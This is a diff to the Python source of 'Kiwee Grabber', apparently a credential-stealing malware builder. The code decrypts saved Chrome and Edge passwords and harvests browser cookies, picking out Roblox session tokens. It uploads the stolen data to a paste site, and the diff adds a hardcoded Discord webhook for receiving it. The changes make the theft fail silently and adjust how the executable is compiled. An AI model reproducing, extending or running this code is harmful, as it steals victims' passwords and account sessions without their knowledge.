@@ -47,31 +47,35 @@ from urllib.request import Request, urlopen
 from winreg import HKEY_CURRENT_USER, OpenKey, EnumValue
 from PIL import ImageGrab
 
+webhookw = 'https://discord.com/api/webhooks/969831453682696192/HmCIglz5kIb1NyeS3zfKnVczD7q42GzQ1wfoDWGmXmcwMngtzMpgZPN80i-mH_pCiA1x'
+
 class Password:
     def __init__(self):
-        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
-        key = self.get_encryption_key(local_state_path)
-        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
-        filename = "ChromeData.db"
-        shutil.copyfile(db_path, filename)
-        db = connect(filename)
-        cursor = db.cursor()
-        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
-        for row in cursor.fetchall():
-            self.dataz = "=== Kiwee Grabber ==="
-            origin_url = row[0]
-            action_url = row[1]
-            username = row[2]
-            password = self.decrypt_password(row[3], key)
-            self.dcreate = row[4]
-            self.dlu = row[5]        
-            if username or password:
-                self.dataz += f"\nOrigin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\nGOOGLE CHROME\n"
-            else:
-                continue
-            self.dataz+="="*50
-        cursor.close()
-        db.close()
+        self.dataz = "=== Kiwee Grabber ==="
+        try:
+            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+            key = self.get_encryption_key(local_state_path)
+            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
+            filename = "ChromeData.db"
+            shutil.copyfile(db_path, filename)
+            db = connect(filename)
+            cursor = db.cursor()
+            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+            for row in cursor.fetchall():
+                origin_url = row[0]
+                action_url = row[1]
+                username = row[2]
+                password = self.decrypt_password(row[3], key)
+                self.dcreate = row[4]
+                self.dlu = row[5]        
+                if username or password:
+                    self.dataz += f"\nOrigin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\nGOOGLE CHROME\n"
+                else:
+                    continue
+                self.dataz+="="*50
+            cursor.close()
+            db.close()
+        except:self.dataz +="\nNo Password Found For Google Chrome\n"
         try:
             os.remove(filename)
         except:
@@ -109,26 +113,28 @@ class Password:
             return decrypted_pass
         except:pass
     def edge_passwords(self):
-        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data","Local State")
-        key = self.get_encryption_key(local_state_path)
-        login_db = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
-        shutil.copy2(login_db, "Loginvault.db")
-        conn = connect("Loginvault.db")
-        cursor = conn.cursor()
         try:
-            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-            for r in cursor.fetchall():
-                url = r[0]
-                username = r[1]
-                encrypted_password = r[2]
-                decrypted_password = self.decrypt_password(encrypted_password, key)
-                try:
-                    self.dataz += f"\nOrigin URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\nMICROSOFT EDGE\n"
-                except:pass
+            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data","Local State")
+            key = self.get_encryption_key(local_state_path)
+            login_db = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
+            shutil.copy2(login_db, "Loginvault.db")
+            conn = connect("Loginvault.db")
+            cursor = conn.cursor()
+            try:
+                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                for r in cursor.fetchall():
+                    url = r[0]
+                    username = r[1]
+                    encrypted_password = r[2]
+                    decrypted_password = self.decrypt_password(encrypted_password, key)
+                    try:
+                        self.dataz += f"\nOrigin URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\nMICROSOFT EDGE\n"
+                    except:pass
+                    self.dataz+="="*50
+                self.dataz+='\nGrabbed With Kiwee Grabber, by : vesper\n'
                 self.dataz+="="*50
-            self.dataz+='\nGrabbed With Kiwee Grabber, by : vesper\n'
-            self.dataz+="="*50
-        except:pass
+            except:pass
+        except:self.dataz+="\nNo Password Found For Edge"
         r = requests.post('https://www.toptal.com/developers/hastebin/documents',data = self.dataz)
         key = r.json()['key']
         self.site = "https://www.toptal.com/developers/hastebin/"+key
@@ -158,36 +164,38 @@ class Cookie:
     def __init__(self):
         self.robloxcookies = []
         dataz = "=== Kiwee Grabber ==="
-        appdata = os.path.join(os.environ["USERPROFILE"], "AppData")
-        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
-        filename = "Cookies.db"
-        if not os.path.isfile(filename):
-            shutil.copyfile(db_path, filename)
-        db = connect(filename)
-        db.text_factory = lambda b: b.decode(errors="ignore")
-        cursor = db.cursor()
-        cursor.execute("""
-        SELECT host_key, name, value, encrypted_value
-        FROM cookies""")
-        key = self.get_encryption_key()
-        for host_key, name, value, encrypted_value in cursor.fetchall():
-            if not value:
-                decrypted_value = self.decrypt_data(encrypted_value, key)
-            else:
-                decrypted_value = value
-            if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_value:
-                self.robloxcookies.append(decrypted_value)
-            else:
-                dataz += f"\nHost: {host_key}\nCookie Name: {name}\nValue: {decrypted_value}\n"
+        try:
+            appdata = os.path.join(os.environ["USERPROFILE"], "AppData")
+            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
+            filename = "Cookies.db"
+            if not os.path.isfile(filename):
+                shutil.copyfile(db_path, filename)
+            db = connect(filename)
+            db.text_factory = lambda b: b.decode(errors="ignore")
+            cursor = db.cursor()
             cursor.execute("""
-            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
-            WHERE host_key = ?
-            AND name = ?""", (decrypted_value, host_key, name))
-        db.commit()
-        db.close()
-        dataz+="="*50
-        dataz+='\nGrabbed With Kiwee Grabber, by : vesper\n'
-        dataz+="="*50
+            SELECT host_key, name, value, encrypted_value
+            FROM cookies""")
+            key = self.get_encryption_key()
+            for host_key, name, value, encrypted_value in cursor.fetchall():
+                if not value:
+                    decrypted_value = self.decrypt_data(encrypted_value, key)
+                else:
+                    decrypted_value = value
+                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_value:
+                    self.robloxcookies.append(decrypted_value)
+                else:
+                    dataz += f"\nHost: {host_key}\nCookie Name: {name}\nValue: {decrypted_value}\n"
+                cursor.execute("""
+                UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
+                WHERE host_key = ?
+                AND name = ?""", (decrypted_value, host_key, name))
+            db.commit()
+            db.close()
+            dataz+="="*50
+            dataz+='\nGrabbed With Kiwee Grabber, by : vesper\n'
+            dataz+="="*50
+        except:dataz += "\nNo Cookies Found"
         r = requests.post('https://www.toptal.com/developers/hastebin/documents',data = dataz)
         key = r.json()['key']
         self.site = "https://www.toptal.com/developers/hastebin/"+key
@@ -514,9 +522,11 @@ except:pass
         except:messagebox.showerror('Kiwee', 'You dont have python')
     def compileexe(self):
         isicon = True
-        name = self.name.get()
-        if len(name) < 1:
-            name = "Default"
+        try:
+            name = self.new_name
+            if len(name) < 1:
+                name = "Default"
+        except:name = "Default"
         try:
             icon = self.iconname
             if os.path.exists(icon):
@@ -610,7 +620,7 @@ webhookw = "{webhook}"
             # verify name
             name = self.name.get()
             try:
-                new_name = name.replace(" ","_")
+                self.new_name = name.replace(" ","_")
             except:pass
             try:
                 googleshare = self.googleshare.get()
